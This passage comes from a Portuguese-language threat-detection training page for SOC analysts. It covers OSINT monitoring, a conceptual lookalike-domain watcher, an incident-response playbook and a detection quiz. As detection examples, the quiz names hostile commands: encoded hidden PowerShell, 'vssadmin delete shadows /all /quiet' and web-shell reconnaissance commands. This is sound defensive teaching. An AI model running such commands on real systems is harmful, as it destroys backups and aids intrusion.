+    <tr><td class="r"><code>Certificate Transparency</code></td><td>Ver dominios de phishing <em>no instante</em> em que ganham certificado</td></tr>
+    <tr><td class="r"><code>Shodan / Censys / FOFA</code></td><td>Monitorar sua propria exposicao ao mesmo tempo que o atacante a ve</td></tr>
+    <tr><td class="r"><code>Passive DNS</code></td><td>Mapear infraestrutura de C2 e dominios irmaos antes do uso</td></tr>
+    <tr><td class="r"><code>Monitoramento de vazamentos</code></td><td>Saber que credenciais vazaram - reset preditivo antes do stuffing</td></tr>
+    <tr><td class="r"><code>Dark web / foruns</code></td><td>Detectar venda de acesso a sua org, ou mencao como alvo</td></tr>
+    <tr><td class="r"><code>dnstwist / typosquatting</code></td><td>Gerar e vigiar todas as variacoes do seu dominio</td></tr>
+    <tr><td class="r"><code>OSINT de pessoas (Layer 8)</code></td><td>Mapear a superficie de spear-phishing dos alvos humanos antes do atacante</td></tr>
+  </table>
+
+  <div class="note osint"><span class="ni">&#10038;</span><div><b>O grande salto conceitual:</b> a deteccao tradicional vive <em>dentro</em> da rede e so ve o ataque quando ele <em>toca</em> voce (tarde). OSINT vive <em>fora</em> e ve os <em>preparativos</em> (cedo). Combine os dois: <b>antes</b> (OSINT ve infra de ataque sendo montada) -&gt; <b>durante</b> (deteccao interna ve a execucao) -&gt; <b>depois</b> (forense reconstroi). A maioria so tem o "durante". O diferencial de elite e ter os tres.</div></div>
+
+  <div class="card">
+    <div class="card-head"><div class="t"><span class="mi">OSINT - CT</span><h3>Vigia de dominios lookalike (CT + dnstwist)</h3></div><div style="display:flex;gap:10px;align-items:center"><span class="sev high">PREDITIVO</span><span class="chev">&#9654;</span></div></div>
+    <div class="card-body">
+      <div class="stage det"><div class="sh">A CACA - antes do e-mail chegar</div>
+        <div class="term"><div class="term-bar"><i></i><i></i><i></i><span>monitor_lookalike.py (conceito)</span></div>
+<pre><span class="c"># 1) gera variacoes plausiveis do seu dominio</span>
+<span class="c">#    minhaempresa.com -&gt; minhaempre5a.com, minha-empresa.com ...</span>
+variacoes = gerar_typosquats(<span class="s">"minhaempresa.com"</span>)
+
+<span class="c"># 2) vigia os feeds de Certificate Transparency</span>
+<span class="k">for</span> novo_cert <span class="k">in</span> stream_ct_logs():       <span class="c"># certs recem-emitidos</span>
+    dominio = novo_cert.dominio
+    <span class="k">for</span> v <span class="k">in</span> variacoes:
+        <span class="c"># similaridade alta com seu dominio = alvo de phishing</span>
+        <span class="k">if</span> parecido(dominio, v):
+            print(<span class="r">f"[PHISH-PREP] {dominio} ganhou cert"</span>)
+            <span class="c"># acao: pre-bloquear no proxy, avisar SOC</span></pre></div>
+        <p style="margin-top:10px">Quando esse alerta dispara, o dominio de phishing geralmente <em>nem enviou o primeiro e-mail ainda</em>. Voce bloqueia no proxy e prepara o time <strong>antes</strong> da campanha. Isso e o sonho da deteccao: chegar primeiro.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="note warn"><span class="ni">&#9656;</span><div><b>Etica e legalidade sempre:</b> OSINT usa apenas fontes <em>publicas e legais</em>. Monitorar sua propria exposicao, certificados publicos, vazamentos que mencionam voce e feeds de ameaca e defesa legitima. Acessar contas sem autorizacao, comprar dados ilicitos ou invadir e crime - e nao e OSINT. A linha e clara: <b>observar o que e publico != acessar o que e privado.</b></div></div>
+</section>
+
+<div class="hr"></div>
+
+<!-- ============ PLAYBOOK ============ -->
+<section id="playbook" class="reveal">
+  <div class="eyebrow"><span class="num">22 /</span> OPERACAO - PLAYBOOK</div>
+  <h2 class="sec">Playbook do Analista - do alerta a decisao</h2>
+  <p class="sec-sub">Tudo que voce aprendeu, agora na sequencia pratica que um analista segue quando um alerta pisca. Memorize este ritmo: ele te impede de entrar em panico e te leva a uma decisao fundamentada toda vez.</p>
+
+  <div class="feynman">
+    <div class="lbl">EXPLICANDO PARA UMA CRIANCA</div>
+    <p>Quando o alarme de incendio toca, voce nao sai correndo em circulos. Voce tem um <span class="em">plano que decorou</span>: para, olha se tem fumaca mesmo (ou foi a torrada queimada?), se for fogo de verdade chama ajuda, fecha a porta pro fogo nao passar, e anota o que viu.</p>
+    <p>O analista tem o mesmo plano para alertas: <span class="em">e real? qual a historia? contem! avisa! aprende!</span> <b>Plano decorado transforma panico em acao.</b></p>
+  </div>
+
+  <h3 style="font-size:16px;margin:22px 0 6px;color:var(--ink)">As 6 fases (NIST: Preparar - Detectar - Conter - Erradicar - Recuperar - Aprender)</h3>
+  <table class="tbl">
+    <tr><th>#</th><th>Fase</th><th>Pergunta-guia & acao</th></tr>
+    <tr><td>1</td><td><strong style="color:var(--blue)">Triagem</strong></td><td>E verdadeiro positivo? Qual severidade? Confirme com fontes cruzadas antes de escalar.</td></tr>
+    <tr><td>2</td><td><strong style="color:var(--violet)">Escopo</strong></td><td>Reconstrua a timeline. Qual o paciente zero? Quem mais foi tocado? (use o grafo)</td></tr>
+    <tr><td>3</td><td><strong style="color:var(--amber)">Contencao</strong></td><td>Isole o host/conta para parar o sangramento - sem destruir evidencia (preserve a RAM).</td></tr>
+    <tr><td>4</td><td><strong style="color:var(--red)">Erradicacao</strong></td><td>Remova persistencia, credenciais comprometidas, backdoors. Tudo que o atacante plantou.</td></tr>
+    <tr><td>5</td><td><strong style="color:var(--sig)">Recuperacao</strong></td><td>Restaure de backup limpo, valide integridade, monitore reincidencia reforcada.</td></tr>
+    <tr><td>6</td><td><strong style="color:#e8a0ff">Licoes</strong></td><td>O que falhou na deteccao? Vire o aprendizado em regra Sigma nova. O ciclo recomeca.</td></tr>
+  </table>
+
+  <div class="note tip"><span class="ni">&#9656;</span><div><b>A regra de ouro do analista:</b> nunca olhe um evento isolado. Sempre pergunte "o que veio <em>antes</em> e o que veio <em>depois</em>?". O incidente e uma historia - e a sua tarefa e remonta-la inteira, do clique inocente ao impacto final. Evento sozinho engana; sequencia revela.</div></div>
+</section>
+
+<div class="hr"></div>
+
+<!-- ============ FINAL QUIZ ============ -->
+<section id="final" class="reveal">
+  <div class="eyebrow"><span class="num">23 /</span> PROVA DE FOGO</div>
+  <h2 class="sec">Prova de Fogo - voce esta pronto?</h2>
+  <p class="sec-sub">Cinco cenarios reais. Responda mentalmente antes de clicar. Se acertar todos, voce internalizou a mentalidade do cacador - nao a memoria, mas o jeito de pensar.</p>
+
+  <div class="quiz">
+    <div class="q"><span class="qi">01</span> Word abre, e logo depois aparece um powershell.exe com "-w hidden -enc". Veredito?</div>
+    <button class="opt" data-c="1">Phishing com macro executando payload - relacao Office-&gt;shell e proibida <span class="res"></span></button>
+    <button class="opt" data-c="0">Atualizacao normal do Office <span class="res"></span></button>
+    <button class="opt" data-c="0">O usuario abriu o PowerShell de proposito <span class="res"></span></button>
+    <div class="exp"><b>Phishing com macro.</b> Aplicativo do Office nunca deveria ser pai de um interpretador de scripts. Some "-w hidden" (esconde janela) e "-enc" (Base64 para ofuscar) e voce tem tres bandeiras numa linha so. Detectar essa relacao pega milhares de variantes de malware - e o poder de mirar no comportamento (topo da Piramide da Dor), nao na assinatura.</div>
+  </div>
+
+  <div class="quiz">
+    <div class="q"><span class="qi">02</span> O host PREMIUM-17 mandava log a cada 2 minutos sem falha. Ha 40 minutos: silencio total. O resto da rede esta normal. O que voce pensa?</div>
+    <button class="opt" data-c="1">Possivel deteccao pela ausencia - atacante pode ter desativado a telemetria <span class="res"></span></button>
+    <button class="opt" data-c="0">Tudo bem, nenhum alerta disparou <span class="res"></span></button>
+    <button class="opt" data-c="0">O host so esta sem atividade hoje <span class="res"></span></button>
+    <div class="exp"><b>Deteccao pela ausencia.</b> O silencio onde deveria haver barulho E o sinal. Um host que sempre fala e de repente cala (enquanto o resto continua normal) pode ter tido o Sysmon/EDR desligado por um atacante (T1562.001). O ato de ficar invisivel e, ele proprio, visivel - se voce conhece o som normal.</div>
+  </div>
+
+  <div class="quiz">
+    <div class="q"><span class="qi">03</span> 1 IP de origem, 180 contas DIFERENTES, exatamente 1 falha de login em cada, tudo em 4 minutos. Que ataque?</div>
+    <button class="opt" data-c="0">Brute force classico <span class="res"></span></button>
+    <button class="opt" data-c="1">Password spraying - muitas contas x 1 tentativa cada x 1 origem <span class="res"></span></button>
+    <button class="opt" data-c="0">Credential stuffing <span class="res"></span></button>
+    <div class="exp"><b>Password spraying.</b> A assinatura e "muitas contas distintas, pouquissimas tentativas por conta, mesma origem" - feito assim de proposito para nao travar contas e ficar abaixo dos limiares. Quem so conta "falhas por usuario" fica cego. A defesa e contar contas-distintas-por-origem.</div>
+  </div>
+
+  <div class="quiz">
+    <div class="q"><span class="qi">04</span> O processo www-data (nginx) aparece como PAI de um /bin/bash rodando "id" e "whoami". O que e?</div>
+    <button class="opt" data-c="1">Web shell / RCE ativo - webserver nao gera shell sozinho <span class="res"></span></button>
+    <button class="opt" data-c="0">Cron job de manutencao <span class="res"></span></button>
+    <button class="opt" data-c="0">Deploy automatizado <span class="res"></span></button>
+    <div class="exp"><b>Web shell / RCE.</b> Um servidor web executando interpretador de comando e uma das relacoes pai-filho mais confiaveis de toda a deteccao. Nao importa qual CVE foi usada nem qual linguagem - o comportamento denuncia. Pega RCE de qualquer origem.</div>
+  </div>
+
+  <div class="quiz">
+    <div class="q"><span class="qi">05</span> Voce ve "vssadmin delete shadows /all /quiet" sendo executado num servidor de arquivos. Acao?</div>
+    <button class="opt" data-c="1">Isolar o host JA - e precursor de ransomware (destruir backup antes de criptografar) <span class="res"></span></button>
+    <button class="opt" data-c="0">Anotar e revisar amanha <span class="res"></span></button>
+    <button class="opt" data-c="0">Provavelmente limpeza de disco normal <span class="res"></span></button>
+    <div class="exp"><b>Isolar imediatamente.</b> Apagar shadow copies e um precursor classico de ransomware (T1490) - acontece ANTES da criptografia para impedir restauracao. E raríssimo legitimo. Detectar aqui te da uma janela preciosa para isolar o host antes da perda total. Cacar precursores &gt; reagir ao impacto.</div>
+  </div>
+
+  <div class="feynman" style="margin-top:30px">
+    <div class="lbl">O QUE LEVAR PARA SEMPRE</div>
+    <p><span class="em">1.</span> Todo log e uma frase de detetive: quem, o que, quando, onde, resultado.</p>
+    <p><span class="em">2.</span> Mire no comportamento (jeito de andar), nao na assinatura (camiseta). Suba a Piramide da Dor.</p>
+    <p><span class="em">3.</span> Nunca olhe evento isolado - reconstrua a historia: antes, durante, depois.</p>
+    <p><span class="em">4.</span> O silencio tambem fala: aprenda a detectar pela ausencia.</p>
+    <p><span class="em">5.</span> OSINT te deixa chegar antes do ataque. Modeling te prepara. Detection te flagra. Intelligence te direciona. Forense te ensina. O ciclo nunca para.</p>
+  </div>
+</section>
+
+
+</div>
+
+<div class="foot">
+  <p><b>OPERAÇÃO VIGIA</b> — Manual Definitivo de Threat Detection · Construído para analistas SOC, threat hunters, blue & purple teams.</p>
+  <p style="margin-top:6px">Filosofia central: <b>"você não detecta o que não entende, e não entende o que nunca viu acontecer."</b></p>
+  <p style="margin-top:6px">Telemetria viva · Detecção pela ausência · OSINT como sentido aumentado.</p>
+</div>
+</main>
+</div>
+
+<script>
+/* progress bar */
+const prog=document.getElementById('prog');
+addEventListener('scroll',()=>{const h=document.documentElement;const p=h.scrollTop/(h.scrollHeight-h.clientHeight)*100;prog.style.width=p+'%'});
+
+/* active nav via IntersectionObserver */
+const links=[...document.querySelectorAll('.sidebar a')];
+const map={};links.forEach(a=>map[a.getAttribute('href').slice(1)]=a);
+const io=new IntersectionObserver((es)=>{es.forEach(e=>{if(e.isIntersecting){links.forEach(l=>l.classList.remove('active'));map[e.target.id]?.classList.add('active')}})},{rootMargin:'-20% 0px -70% 0px'});
+document.querySelectorAll('section').forEach(s=>io.observe(s));
+
+/* reveal */
+const ro=new IntersectionObserver(es=>es.forEach(e=>{if(e.isIntersecting){e.target.classList.add('in');ro.unobserve(e.target)}}),{rootMargin:'0px 0px -8% 0px'});
+document.querySelectorAll('.reveal').forEach(el=>ro.observe(el));
+
+/* collapsible cards */
+document.addEventListener('click',e=>{
+  const h=e.target.closest('.card-head');
+  if(h){h.parentElement.classList.toggle('open')}
+});
+
+/* quiz */
+document.addEventListener('click',e=>{
+  const o=e.target.closest('.opt');
+  if(o && !o.closest('.quiz').classList.contains('answered')){
+    const quiz=o.closest('.quiz');quiz.classList.add('answered');
+    [...quiz.querySelectorAll('.opt')].forEach(x=>{
+      if(x.dataset.c==='1'){x.classList.add('correct');x.querySelector('.res').textContent='✓ correto'}
+      else if(x===o){x.classList.add('wrong');x.querySelector('.res').textContent='✗'}
+    });
+  }
+});
+
+/* nav filter */
+const ns=document.getElementById('nav-search');
+ns.addEventListener('input',()=>{
+  const q=ns.value.toLowerCase();
+  document.querySelectorAll('#nav a').forEach(a=>{
+    a.style.display=a.textContent.toLowerCase().includes(q)?'flex':'none';
+  });
+});
+addEventListener('keydown',e=>{if(e.key==='/'&&document.activeElement!==ns){e.preventDefault();ns.focus()}});
+
+/* close mobile menu on nav click */
+document.querySelectorAll('#nav a').forEach(a=>a.addEventListener('click',()=>document.querySelector('.sidebar').classList.remove('show')));
+</script>
+</body>
+</html>
